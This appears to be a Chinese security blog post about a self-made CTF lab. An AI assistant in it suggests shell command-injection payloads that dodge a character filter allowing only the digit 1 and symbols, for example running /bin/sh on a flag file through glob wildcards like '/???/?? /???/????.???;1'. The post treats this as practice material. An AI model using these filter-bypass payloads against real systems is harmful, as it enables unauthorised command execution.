---
title: 有0也有1
url: https://mp.weixin.qq.com/s/FDGa-SqrWaLdbwAqWr0NAw
source: Doonsec's feed
date: 2026-01-16
fetch_date: 2026-01-17T03:20:36.262123
---

# 有0也有1

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/jhBO4w8SLibWZgLUV7D82lM1qf7oe4YZZQysV0HptH2fiaox6bt6cRazEBA99a0GASTb2IgNsHwGedbIX7rTsaVQ/0?wx_fmt=jpeg)

# 有0也有1

原创

泷羽Sec静安
泷羽Sec静安

泷羽Sec-静安

![]()

在小说阅读器中沉浸阅读

> 关注**泷羽Sec**和**泷羽Sec-静安**公众号，这里会定期更新与 OSCP、渗透测试等相关的最新文章，帮助你理解网络安全领域的最新动态。

打完上一篇我不过瘾，我问AI

> [!question]
> 换个思路，加入只能用数字1和符号，不能用2-9和0不能用字母呢

好思路！如果只能用 **数字 1** 和符号，不能用字母、0、2-9，那我们来分析：

---

## 可用元素

| 可用 | 不可用 |
| --- | --- |
| `1` | 字母 a-z A-Z |
| `?``*``[]` | 数字 0, 2-9 |
| `$``.``/``:``;` |  |
| `|``&``>``<` |  |
| `'``"``` ` `` |  |
| `()``{}``[]` |  |
| `!``@``#``%``^` |  |
| `-``_``+``=` |  |

---

## 关键突破点

### 1. `$1` - 第一个参数（可能为空）

### 2. 文件描述符 `1` = stdout

```
# 重定向相关
>&1      # 重定向到 stdout
<&1      # 从 fd 1 读
1>&1     # fd 1 到 fd 1
```

### 3. 用 `$?` 和算术构造

```
# 如果上一条命令成功，$? = 0
# 但 0 不能用...

# $((!$?)) 如果 $?=0，则 !0=1
# 但这需要更多技巧
```

### 4. 利用 `/???/???` 通配符 + 结合 1

```
# 执行文件，结合 fd 1
. /???/????.???>&1      # source + 重定向到 stdout
. /???/????.??? 1>&1    # 带 fd 重定向
```

---

## 可能的 Payload

### 方案一：用 `.` (source) + fd 1

```
. /???/????.???;1        # source 后执行 1（报错）
. /???/????.???|1        # 管道给 1
. /???/????.??? 1>&1     # 重定向
. /???/????.???<&1       # 从 fd 1 读
```

### 方案二：利用 `$_` 或其他特殊变量

```
# $_ 是上一个命令的最后参数
# 但第一次用可能是空或 shell 路径
$_ /???/????.???;1
```

### 方案三：用 `{:;}` 空命令 + 重定向

```
{. /???/????.???;} 1>&1
{:;} </???/????.??? 1>&1
```

### 方案四：构造 shell 路径

```
# /bin/sh = /???/??
# /bin/bash = /???/????

# 但怎么执行？需要 $0 或其他方式...
# $1 通常是空的

# 试试
/???/?? /???/????.???;1     # 直接调用 /bin/sh
/???/????  /???/????.???;1  # 直接调用 /bin/bash
```

### 方案五：进程替换或子shell

```
(. /???/????.???) 1>&1
$(. /???/????.???) 1
`. /???/????.???` 1
```

---

## 最有可能成功的

```
# 直接路径执行（如果允许 /）
/???/?? /???/????.???;1      # /bin/sh 执行 flag

# source + fd 1
. /???/????.???;1
. /???/????.??? 1>&1

# 管道
. /???/????.???|1
```

---

## 对比两种限制

| 限制 | 关键变量 | 执行方式 |
| --- | --- | --- |
| 只能用 0 | `$0` = 当前 shell | `$0 /???/????.???` |
| 只能用 1 | `$1` = 第一个参数（空） | `. /???/????.???;1` 或 `/???/?? /???/????.???;1` |

**只能用 1 的情况下**，没有 `$0` 这么方便的 shell 引用，所以要用：

1. 1. **`.` (source)** 命令
2. 2. **直接路径**`/???/??`（匹配 `/bin/sh`）
3. 3. **文件描述符**`1>&1`

---

试试这个：

```
/???/?? /???/????.???;1
```

这应该能匹配 `/bin/sh /tmp/flag.txt`！

其实0和1在管道通配符的作用都差不多的，所以我又让AI给我写了一个姊妹篇靶场1，没想到AI给的
`flag{1_1s_th3_l0n3l13st_numb3r_7h4t_y0u_3v3r_kn3w}`

> [!question]
> I is the loneliest number that you ever knew
> 这实际上是一句英文歌词，来自美国摇滚乐队Three Dog Night的歌曲 《One》（1969年发行），原歌词是：
> “One is the loneliest number that you’ll ever do” （你这里写的是 “that you ever knew”，可能是变体或误记，但意思相近）。
> 所以这句话的意思是： “一是你所知道的最孤独的数字”，用来表达数字“1”象征孤独、独自一人的感受。
> 你还挺有品味

哈哈，被你发现了！🎵

没错，这首歌太经典了。用它来做 flag 是因为：
要不要我给"数字0的奇迹"也配一个 **Smashing Pumpkins - Zero** 的 flag？

```
flag{z3r0_1s_wh4t_th3y_g4v3_m3}
```

> "Zero is what they gave me" 🎸

535f729fa551b42263ef01d3b3d92d7.png

a25002002f82b578fb6493367b1e1cd.png

9b2df7939f8b793f3908b20fa7e35e5.png

欢迎朋友来玩，复制到夸克中即可，或者扫码打开

```
我用夸克网盘给你分享了「有0也有1」，点击链接或复制整段内容，打开「夸克APP」即可获取。
动作与召熛健身多好
/~59443A42p0~:/
链接：https://pan.quark.cn/s/f8ace7b20ef3
```

---

🔔 **想要获取更多网络安全与编程技术干货？**

关注 **泷羽Sec-静安** 公众号，与你一起探索前沿技术，分享实用的学习资源与工具。我们专注于深入分析，拒绝浮躁，只做最实用的技术分享！💻

马上加入我们，共同成长！🌟

👉 **长按或扫描二维码关注公众号**

直接回复文章中的关键词，获取更多技术资料与书单推荐！📚

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibW5p6wbicQ0VW9SdZ5W8ZWkqe9tVTwyQgoXibAE7B1CTqg3xb7Cficq1keBssjNq9n4uR4OxLWgVDU3w/0?wx_fmt=png)

泷羽Sec-静安

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibW5p6wbicQ0VW9SdZ5W8ZWkqe9tVTwyQgoXibAE7B1CTqg3xb7Cficq1keBssjNq9n4uR4OxLWgVDU3w/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过